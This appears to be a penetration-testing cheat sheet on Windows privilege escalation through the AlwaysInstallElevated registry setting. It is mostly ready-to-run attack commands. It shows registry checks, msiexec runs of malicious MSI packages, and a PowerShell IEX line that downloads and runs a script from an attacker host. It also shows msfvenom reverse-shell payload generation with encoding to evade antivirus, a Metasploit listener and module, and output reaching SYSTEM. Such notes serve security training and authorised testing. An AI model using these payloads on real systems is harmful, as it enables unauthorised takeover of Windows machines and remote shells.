### **AlwaysInstallElevated**

### **Check if Vulnerable**

If both the **HKLM** (`HKEY_LOCAL_MACHINE`) and **HKCU** (`HKEY_CURRENT_USER`) hives have the **AlwaysInstallElevated** key set to `1`, an attacker can create and execute a malicious MSI package with system-level privileges, bypassing normal user restrictions.

**How to Check for the Vulnerability**

```powershell
# Check in HKEY_LOCAL_MACHINE for system-wide policy
reg query HKLM\software\policies\microsoft\windows\installer /v alwaysinstallelevated
or
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

# Check in HKEY_CURRENT_USER for user-specific policy
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
or
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

```

**Interpreting the Results**

- If both registry keys return a value of `1`, it means **AlwaysInstallElevated** is enabled, and the system is vulnerable to this escalation technique.
- If one or both keys return an error or a value other than `1`, the vulnerability is not present.

### **Exploit - NewLocalAdmin**

**Steps**

1. **Upload the `newlocaladmin.msi`** to the victim.
2. **Execute it**

```powershell
msiexec /quiet /qn /i newlocaladmin.msi

```

1. **Upload the script `Invoke-RunasCs.ps1`** to the victim

```powershell
# Directly load it in memory
IEX (New-Object Net.WebClient).DownloadString('http://[ATTACKER_IP]/Invoke-RunasCs.ps1')

# Normal download, be careful for AV Detection, consider placing it in the /Temp or /Tasks folders
iwr -uri http://[ATTACKER_IP]/Invoke-RunasCs.ps1 -Outfile Invoke-RunasCs.ps1
Import-Module ./Invoke-RunasCs.ps1

```

1. **Get Code Execution** with the newly created user

```powershell
Invoke-RunasCs amit 'Password123!' 'whoami /priv' -ForceProfile -CreateProcessFunction 2 -BypassUac

```

- [GitHub Reference](https://github.com/Extravenger/OSEPlayground/tree/main/06%20-%20Privilege%20Escalation/AlwaysInstallElevated)

### **Exploit - Reverse Shell**

**Steps** If both keys are set to `1`, you can create a malicious MSI package to escalate privileges:

1. **Generate a malicious MSI**: this payload could open a reverse shell, create a new administrative user, or perform another privileged action.

```bash
windows/x64/meterpreter/reverse_https
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[LHOST] LPORT=[PORT] -f msi -o malicious.msi

```

1. Setup a Listener

```bash
sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost [ATTACKER_IP]; set lport [PORT]; exploit"

```

1. **Execute the MSI**: as a low-privileged user, execute the MSI package using the Windows Installer (`msiexec`), and it will run with elevated privileges.

```bash
# If the payload is a reverse shell, it could maybe work by just executing the .msi, try it; otherwise just use below steps
./malicious.msi

# This will install and execute the malicious MSI with system-level permissions, allowing you to escalate your privileges.
msiexec /quiet /qn /i malicious.msi

# The /quiet and /qn flags ensure that the installation runs silently without user interaction
# The /i flag specifies that you're installing the MSI package.

```

### **Exploit - Meterpreter Built In Module**

**Steps**

1. You need to already have a Meterpreter session for the victim
2. **Load the module**

```bash
msf6 exploit(multi/handler) > use exploit/windows/local/always_install_elevated

```

1. **Set the Options**, it is important to change the default options or we will be flagged by the AV

```bash
msf6 exploit(windows/local/always_install_elevated) > set VERBOSE true
msf6 exploit(windows/local/always_install_elevated) > set payload windows/exec
msf6 exploit(windows/local/always_install_elevated) > set session [SESSION_ID]

```

1. **Encode and run your command**

```bash
# Option 1 - We can first try with encoded Powershell command, here 'whoami > C:\whoami.txt'
msf6 exploit(windows/local/always_install_elevated) > set cmd 'powershell -enc dwBoAG8AYQBtAGkAIAA+ACAAQwA6AFwAdwBoAG8AYQBtAGkALgB0AHgAdAA='

msf6 exploit(windows/local/always_install_elevated) > run
[*] Uploading the MSI to C:\Users\user\AppData\Local\Temp\uDBjvv.msi ...
[*] Executing MSI...
[*] Exploit completed, but no session was created.
msf6 exploit(windows/local/always_install_elevated) > sessions 1
[*] Starting interaction with 1...

meterpreter > cat C:/whoami.txt
nt authority\system

# Option 2 - Run a Meterpreter reverse shell program
msf6 exploit(windows/local/always_install_elevated) > set cmd 'C:\met.exe'
msf6 exploit(windows/local/always_install_elevated) > run

[*] Uploading the MSI to C:\Users\user\AppData\Local\Temp\uBnecgivVWuR.msi ...
[*] Executing MSI...
[*] Sending stage (175174 bytes) to 192.168.X.Y
[*] Meterpreter session 2 opened (192.168.X.Y:443 -> 192.168.Z.Z:49798 ) at 2022-06-03 21:29:45 +0200

```

1. **(Optional)** We can also try the following payload and see if it works

```bash
# Create the payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[ATTACKER_IP] LPORT=443 -e x64/xor_dynamic -i 3 -f msi -o met.msi

# Start an HTTP Server

# Execute it
msiexec /q /i http://[ATTACKER_IP]/met.msi

```
